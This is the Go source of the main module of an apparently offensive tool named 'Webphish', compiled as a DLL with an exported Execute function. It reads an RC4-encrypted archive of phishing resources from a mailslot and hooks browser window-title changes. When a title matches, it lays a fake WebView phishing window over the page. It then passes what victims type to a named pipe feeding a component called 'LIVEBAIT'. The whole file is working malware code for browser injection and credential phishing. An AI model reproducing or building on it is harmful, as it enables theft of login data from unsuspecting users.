package main

import "C"
import (
	"Webphish/internal"
	"Webphish/internal/console"
	"Webphish/internal/edge"
	"Webphish/internal/handler"
	"Webphish/internal/notify"
	"Webphish/internal/notify/event"
	"Webphish/internal/resource"
	"Webphish/internal/resource/client"
	"Webphish/internal/resource/decoder"
	"Webphish/internal/resource/loader"
	"Webphish/internal/w32"
	"Webphish/internal/win"
	"Webphish/internal/writer"
	"Webphish/internal/writer/pipe"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"sync"
)

var PhishHandler handler.BrowserHandler
var Parent windows.HWND
var PhishWindow edge.WebView

func init() {
	var success bool
	var exeFile string

	exeFile = w32.GetRunningExecutable()
	PhishHandler, success = handler.GetBrowser(exeFile)
	if !success {
		os.Exit(-1)
	}
}

type WindowCloseWriter struct {
	writer   writer.ApplicationOutputWriter
	signal   chan bool
	cond     *bool
	lock     *sync.Mutex
	notifier notify.Notifier
}

func (w *WindowCloseWriter) Capture(msg string, setupSignal chan bool) internal.ErrorCode {
	// TODO: Add timeout in Capture in case LIVEBAIT is dead and does not receive captured data
	go w.writer.Capture(msg, setupSignal)
	ready := <-setupSignal
	if !ready {
		return internal.ERR_FAILED_NOTIFY
	}
	w.notifier.Notify()

	//console.MessageBoxPlain("Info", fmt.Sprintf("Received: %s", msg))
	w.lock.Lock()
	*w.cond = false
	w.signal <- true
	w.lock.Unlock()
	return 0
}

//export Execute
func Execute() {
	var windowLock sync.Mutex
	var outputWriter writer.ApplicationOutputWriter
	var notifier notify.Notifier
	var errCode internal.ErrorCode
	var reader resource.Client
	var coder resource.Decoder
	var ldr resource.Loader

	killWindow := make(chan bool, 1)
	phishActive := false
	coder = decoder.NewRC4ZipDecoder()
	ldr = loader.NewBasicLoader()

	username := internal.GetUserName()
	if username == "" {
		username = "win32" // default pipe name
	}
	outputWriter = pipe.New(username)
	notifier, errCode = event.New(username)
	if errCode != internal.GenericSuccess {
		//console.MessageBoxPlain("Error", "Failed to create event")
		return
	}

	killOnReceive := WindowCloseWriter{
		writer:   outputWriter,
		signal:   killWindow, // must handle changing phishActive somehow
		cond:     &phishActive,
		lock:     &windowLock,
		notifier: notifier,
	}
	PhishHandler.SetOutputWriter(&killOnReceive)

	mailslotName := fmt.Sprintf("mx%s", username)
	reader = client.NewMailslotReader(mailslotName)
	encArchive, err := reader.Get()
	if err != internal.GenericSuccess {
		console.MessageBoxPlain("Error", "Failed to read encrypted archive from mailslot")
		return
	}
	files, err := coder.Decode(encArchive)
	if err != internal.GenericSuccess {
		console.MessageBoxPlain("Error", "Failed to decode payload")
		return
	}
	for _, file := range files {
		err = ldr.Put(&file)
		if err != internal.GenericSuccess {
			console.MessageBoxPlain("Error", fmt.Sprintf("Failed to put file with path: %s", file.Path))
			return
		}
	}
	PhishHandler.SetResourceLoader(ldr)

	win.SetTitleChangedHook(-1, func(title string, hwnd windows.HWND) {
		windowLock.Lock()
		if phishActive {
			phishActive = false
			killWindow <- true
		}
		windowLock.Unlock()

		hasInject := ldr.HasMatchingResources(title)
		if hasInject {

			Parent, PhishWindow = PhishHandler.Handle(title, hwnd)

			if PhishWindow != nil {
				windowLock.Lock()
				phishActive = true
				windowLock.Unlock()
			}
			go win.FollowParent(Parent, PhishWindow, killWindow)

		}
	})

	for {
		win.WindowDispatcher()
	}

}

func main() {
}
